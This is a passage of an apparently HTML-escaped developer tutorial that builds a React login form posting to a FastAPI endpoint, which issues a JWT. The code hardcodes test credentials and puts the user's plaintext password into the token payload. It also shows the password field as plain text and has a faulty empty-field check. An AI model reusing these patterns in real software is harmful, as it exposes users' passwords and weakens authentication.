                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/form&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="p"&gt;)}&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll be pausing there for now. It's time to work on our backend.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#creating-the-backend"&gt;
  &lt;/a&gt;
  Creating the backend
&lt;/h3&gt;

&lt;p&gt;Now lets open up our backend folder, create a &lt;code&gt;main.py&lt;/code&gt; file and input the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pydantic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseModel&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;jwt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pydantic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseModel&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi.encoders&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;jsonable_encoder&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi.middleware.cors&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CORSMiddleware&lt;/span&gt;


&lt;span class="n"&gt;SECERT_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"YOUR_FAST_API_SECRET_KEY"&lt;/span&gt;
&lt;span class="n"&gt;ALGORITHM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"HS256"&lt;/span&gt;
&lt;span class="n"&gt;ACCESS_TOKEN_EXPIRES_MINUTES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;

&lt;span class="n"&gt;test_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="s"&gt;"username"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"temitope"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"temipassword"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;origins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s"&gt;"http://localhost"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s"&gt;"http://localhost:3000"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_middleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
   &lt;span class="n"&gt;CORSMiddleware&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_origins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;origins&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_credentials&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_methods&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"*"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="n"&gt;allow_headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"*"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LoginItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseModel&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;

    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;read_root&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"Hello"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"World"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/login"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;user_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loginitem&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;LoginItem&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;


    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsonable_encoder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loginitem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;test_user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;test_user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;

        &lt;span class="n"&gt;encoded_jwt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jwt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SECERT_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ALGORITHM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"token"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;encoded_jwt&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"message"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;"login failed"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we are trying to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Generate a token.&lt;/li&gt;
&lt;li&gt;Defining a &lt;code&gt;test user object&lt;/code&gt; to check against the user login credentials&lt;/li&gt;
&lt;li&gt;Configuring our &lt;code&gt;CORS&lt;/code&gt; to allow our React app to send POST requests&lt;/li&gt;
&lt;li&gt;Running a check with the coming data with &lt;code&gt;test_user&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Almost done now that we're done, let's go back to the fronted and finish things up. head over to login.js and replace with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;axios&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;axios&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;//check to see if the fields are not empty&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// make api call to our backend. we'll leave thisfor later&lt;/span&gt;
      &lt;span class="nx"&gt;axios&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;http://localhost:8000/login&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="na"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;response.data.token&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;setToken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;navigate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;you&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;logged&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
              &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
              &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nx"&gt;Login&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/form&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="p"&gt;)}&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
